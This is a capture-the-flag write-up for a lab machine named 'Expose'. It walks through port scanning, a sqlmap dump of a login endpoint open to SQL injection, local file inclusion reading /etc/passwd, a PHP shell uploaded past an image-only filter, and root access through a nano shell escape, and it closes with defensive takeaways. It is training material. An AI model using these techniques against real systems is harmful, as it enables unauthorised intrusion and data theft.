# Expose — Write-up

## Objective

Use your red teaming knowledge to pwn a Linux machine.

Exposing unnecessary services on a machine can be dangerous. Can you capture the flags and pwn the machine?

**Questions to answer:**

- What is the user flag?
- What is the root flag?

---

## Initial Recon

```bash
nmap -sS -sV -sC 10.82.141.177 -p-
```

```
PORT     STATE SERVICE                 VERSION
21/tcp   open  ftp                     vsftpd 2.0.8 or later
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh                     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain                  ISC BIND 9.16.1 (Ubuntu Linux)
1337/tcp open  http                    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: EXPOSED
1883/tcp open  mosquitto version 1.6.9
| mqtt-subscribe:
|   Topics and their most recent payloads:
|     $SYS/broker/version: mosquitto version 1.6.9
|     ... (broker $SYS stats)
```

Five services exposed: FTP (anonymous login allowed), SSH, DNS, a web app on port 1337, and an MQTT broker leaking its `$SYS` stats.

```bash
gobuster dir -w raft-medium-words.txt -u http://10.82.141.177:1337
```

```
/.php                 (Status: 403) [Size: 280]
/admin                (Status: 301) [Size: 321] [--> http://10.82.141.177:1337/admin/]
/javascript           (Status: 301) [Size: 326] [--> http://10.82.141.177:1337/javascript/]
/phpmyadmin           (Status: 301) [Size: 326] [--> http://10.82.141.177:1337/phpmyadmin/]
/admin_101            (Status: 301) [Size: 325] [--> http://10.82.141.177:1337/admin_101/]
```

`/admin_101` had an email already sitting in the email field: `hacker@root.thm`.

---

## Finding the SQL Injection

Inside the source of the login page:

```html
<script type="text/javascript">
    $('#login').on('click',function(){
        $.ajax({
            url: 'includes/user_login.php',
            method: 'POST',
            data: {
                'email' : $('input[name="email"]').val(),
                'password' : $('input[name="password"]').val(),
            },
            success(data)
            {
                console.log(data)
                if(data)
                {
                    if(data.status && data.status == 'success')
                        location.href = 'chat.php';
                    else{
                        console.log(data.status)
                        alert(data.status)
                    }
                }
            }
        })
    })
</script>
```

Testing the endpoint directly:

```bash
curl -s -X POST http://10.82.141.177:1337/admin_101/includes/user_login.php \
-d "email=hacker@root.thm&password=test"
```

```json
{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'hacker@root.thm'"
    ]
}
```

The message indicates the query is echoing back the raw SQL with the input concatenated in — a strong sign it's vulnerable to SQL injection.

---

## Dumping the Database

```bash
sqlmap -u "http://10.82.141.177:1337/admin_101/includes/user_login.php" \
--data="email=hacker@root.thm&password=test" \
-p email \
--dump-all \
--output-dir=sqlmap_dump \
--batch
```

Opening `user.csv` gave me the full login details for the admin login form:

```
1,hacker@root.thm,2023-02-21 09:05:46,VeryDifficultPassword!!#@#@!#!@#1231
```

Inside `config.csv` I received some interesting URL attachments:

```
id,url,password
1,/file1010111/index.php,69c66901194a6486176e81f5945b8929 (easytohack)
3,/upload-cv00101011/index.php,// ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z
```

---

## LFI via a Fuzzed Parameter

Visiting `/file1010111/index.php` gave me a hint: "Parameter Fuzzing is also important :) or Can you hide DOM elements?" Inside the source code: "Hint: Try `file` or `view` as GET parameters?"

I tried a local file inclusion:

```
http://10.82.141.177:1337/file1010111/index.php?file=/etc/passwd
```

It worked!

---

## Pivoting to zeamkish and Uploading a Shell

Looking at the earlier hint — "ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z" — I looked for a name inside `/etc/passwd` beginning with Z and found `zeamkish`. With this name I was able to log into the next path.

The next step was to upload a PHP shell. The server only accepted PNG and JPG files. I used Burp to upload a PNG, then intercepted the request and swapped the PNG data for a PHP shell. The response was successful and gave me the path of the uploaded file: `/upload_thm_1001`.

Setting up an nc listener, I was able to get into the server. Inside the `/home` folder was the SSH creds for `zeamkish`:

```
$ cat ssh_creds.txt
SSH CREDS
zeamkish
easytohack@123
```

Using these creds I was able to get the first flag.

**Flag:** `THM{US##########1_EXPOSE}`

---

## Privilege Escalation via nano

I noticed `nano` had elevated privileges. I opened `nano` and used **Ctrl+R, Ctrl+X** to spawn a command prompt, and read `/root/flag.txt` directly through it.

**Flag:** `THM{ROOT_EX######_1001}`

---

## Summary

- **Recon:** Nmap uncovered five exposed services — anonymous FTP, SSH, DNS, a web app on the unusual port 1337, and an MQTT broker leaking its `$SYS` topic tree. Gobuster on the web app found an admin login (`/admin_101`) with a pre-filled email.
- **SQL injection:** The login endpoint echoed the raw, unsanitized SQL query back in its error response, confirming SQL injection. `sqlmap` dumped the user table and a config table, yielding the admin password and two hidden, hint-only URLs.
- **LFI:** One of the hidden URLs pointed to a page vulnerable to local file inclusion via a `file` GET parameter, discovered through parameter fuzzing hinted at in the page itself — used to read `/etc/passwd`.
- **Username pivot + upload bypass:** A restriction ("only accessible through username starting with Z") pointed at the `zeamkish` account found in `/etc/passwd`. A file-upload feature that only checked image extensions was bypassed in Burp by swapping a PNG upload for a PHP shell, giving a foothold and SSH creds for `zeamkish` — the **user flag**.
- **Privesc via `nano`:** `zeamkish` had elevated privileges to run `nano`, which was abused via its built-in shell-escape keybinding to read the root flag directly.

**Key takeaways:**

- Anonymous FTP, an exposed MQTT `$SYS` tree, and a web app on a non-standard port are all "unnecessary exposure" in their own right — each one widened the attack surface here even before the actual vulnerabilities were found.
- Echoing raw SQL (or any backend query/error) back to the client is a strong SQL injection indicator on its own, even before running a tool like `sqlmap` to confirm it.
- File upload filters that only check the extension (not content) can be bypassed trivially by intercepting and swapping the payload after client-side validation has already passed.
- Granting `sudo`/elevated rights to interactive editors like `nano`, `vim`, `less`, or `more` is a classic GTFOBins-style privesc vector — these tools have built-in ways to spawn a shell or run commands.
